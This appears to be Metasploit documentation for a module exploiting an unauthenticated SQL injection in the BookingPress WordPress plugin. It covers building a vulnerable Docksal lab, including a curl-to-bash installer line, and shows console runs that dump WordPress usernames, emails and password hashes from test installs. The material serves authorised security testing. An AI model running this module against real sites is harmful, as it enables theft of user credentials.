## Vulnerable Application

The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied data
in the `total_service` parameter of the `bookingpress_front_get_category_services` AJAX action
(available to unauthenticated users), prior to using it in a dynamically constructed SQL query.
As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive
data from the backend database such as usernames and password hashes.

This module uses this vulnerability to dump the list of WordPress users and their associated
email addresses and password hashes for cracking offline.

### Setup
#### Ubuntu 20.04 with Docksal
Install Docksal:

```bash
sudo apt update
sudo apt install curl
bash <(curl -fsSL https://get.docksal.io)
sudo usermod -aG docker $USER
```

Reboot the VM (Docksal needs to be able to run `docker` without sudo).

```bash
msfuser@ubuntu:~$ fin project create
1. Name your project (lowercase alphanumeric, underscore, and hyphen): msf

2. What would you like to install?
   PHP based
    1.  Drupal 9 (Composer Version)
    2.  Drupal 9 (BLT Version)
    3.  Drupal 9
    4.  Drupal 7
    5.  Wordpress
    6.  Magento
    7. Laravel
    8. Symfony Skeleton
    9. Symfony WebApp
    10. Grav CMS
    11. Backdrop CMS

Go based
12. Hugo

JS based
13. Gatsby JS
14. Angular

HTML
15. Static HTML site

Custom
0. Custom git repository


Enter your choice (0-15): 5

Project folder:   /home/msfuser/msf
Project software: Wordpress
Source repo:      https://github.com/docksal/boilerplate-wordpress.git
Source branch:    <default>
Project URL:      http://msf.docksal

Do you wish to proceed? [y/n]: y

...

Success: WordPress installed successfully.

real	0m10.112s
user	0m0.327s
sys	0m0.061s
Open http://msf-wp.docksal in your browser to verify the setup.
Admin panel: http://msf-wp.docksal/wp-admin. User/password: admin/admin
 DONE!  Completed all initialization steps.
```

Download a vulnerable version of BookingPress:
`wget https://downloads.wordpress.org/plugin/bookingpress-appointment-booking.1.0.10.zip`

Navigate to the WordPress admin page that was just setup by Docksal at
http://msf-wp.docksal/wp-admin and log in with the username `admin` and password `admin`.

Navigate to `Plugins` on the left hand menu, then select `Add New` then select `Upload Plugin`.

Select `Browse...` and browse to the `bookingpress-appointment-booking.1.0.10.zip` file just downloaded, click `Install Now`.

You should see the following output in the browser:

```
Installing Plugin from uploaded file: bookingpress-appointment-booking.1.0.10.zip

Unpacking the package…

Installing the plugin…

Plugin installed successfully.
```

Click `Activate Plugin`.

The BookingPress plugin has to be in use on the WordPress site in order to exploit the vulnerability.
To activate it, follow the directions below:

1. Navigate to `/wp-admin/admin.php?page=bookingpress_services`.
1. Click `Manage Categories`, then click `+ Add New`, enter a `Category Name` and click `Save`.
1. Beside `Manage Services` click `+ Add New`, enter a `Service Name`, enter the Category you just created in the `Category` dropdown, enter a `Price` and click `Save`.
1. Select `+ New` at the top of the screen and then select `Page` from the dropdown to create a new WordPress page.
1. Paste `[bookingpress_form]` on the new page and click `publish`.
1. Navigate to `/bookingpress/` and you should see BookPress running with the Category / Service you created in step 1.

### Installation Notes
You may need to increase the size of file uploads to install the BookingPress plugin. To do this, you can use
https://wordpress.org/plugins/tuxedo-big-file-uploads/ or https://wordpress.org/plugins/wp-maximum-upload-file-size/
to increase the file upload size. I then had to some fiddling around since it may take some time for the changes
to be picked up. You may have success if you also install https://wordpress.org/plugins/custom-php-settings/, so
this is worth a shot if you are having issues.

## Verification Steps

1. Start msfconsole.
1. Do: `use auxiliary/gather/wp_bookingpress_category_services_sqli`.
1. Set the options `RHOSTS` to the target WordPress host IP address.
1. Set `RPORT` to the port that the target WordPress install is running on.
1. Set `BOOKING_PRESS_PAGE` to the path on the WordPress host where the BookingPress make a booking page is.
1. Verify visiting this URL shows "Select Category" and "Select Service" on the resulting page.
1. Run the module.
1. Receive a table of WordPress users and their associated email addresses and password hashes.

## Scenarios
### Booking Press 1.0.10, WordPress Running Via Docksal, Ubuntu 20.04
```
msf6 > use gather/wp_bookingpress_category_services_sqli
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rhosts localhost
rhosts => localhost
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set rport 8000
rport => 8000
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Extracting credential information
Wordpress User Credentials
==========================

 Username       Email                         Hash
 --------       -----                         ----
 admin          admin@admin.com               $P$BfxUckldN6AiHPD0BK6jg58se2b.aL.
 hackerman      hackerman@hacktheworld.io     $P$BESfz7bqSOY8VkUfuYXAZ/bT5E36ww/
 mr_metasploit  mr_metasploit@metaslpoit.org  $P$BDb8pIfym5dS6WTnNU8vU5Uk6i89fk.
 msfuser        msfuser@rapid7.com            $P$BpITVDPiqOZ7fyQbI5g9rsgUvZQFBd1
 todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0

[*] Auxiliary module execution completed
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set AutoCheck false
AutoCheck => false
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > run

[!] AutoCheck is disabled, proceeding with exploitation
[*] Extracting credential information
Wordpress User Credentials
==========================

 Username       Email                         Hash
 --------       -----                         ----
 admin          admin@admin.com               $P$BfxUckldN6AiHPD0BK6jg58se2b.aL.
 hackerman      hackerman@hacktheworld.io     $P$BESfz7bqSOY8VkUfuYXAZ/bT5E36ww/
 mr_metasploit  mr_metasploit@metaslpoit.org  $P$BDb8pIfym5dS6WTnNU8vU5Uk6i89fk.
 msfuser        msfuser@rapid7.com            $P$BpITVDPiqOZ7fyQbI5g9rsgUvZQFBd1
 todd           todd@toddtown.com             $P$BnlpkVgxGFWnmvdDQ3JStgpIx8LMFj0

[*] Auxiliary module execution completed
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
```

### Booking Press 1.0.10, WordPress Latest Docker Image on Debian 11 (bullseye)
```
msf6 > use auxiliary/gather/wp_bookingpress_category_services_sqli
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set RPORT 8000
RPORT => 8000
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set TARGETURI "/?page_id=10"
TARGETURI => /?page_id=10
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > show options

Module options (auxiliary/gather/wp_bookingpress_category_services_sqli):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /?page_id=10     yes       The URL of the BookingPress appointment booking page
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > check
[+] 127.0.0.1:8000 - The target is vulnerable.
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > exploit
[*] Running module against 127.0.0.1

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Extracting credential information
Wordpress User Credentials
==========================

 Username   Email                  Hash
 --------   -----                  ----
 normal     normal@test.com        $P$Bu9/XNK93oyUTKO.zJ9yGZfYAcbZg9.
 testAdmin  test@testfakeness.com  $P$BYWtZOfh8yqLCKA877hwBysqGdRtk/.

[*] Auxiliary module execution completed
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
```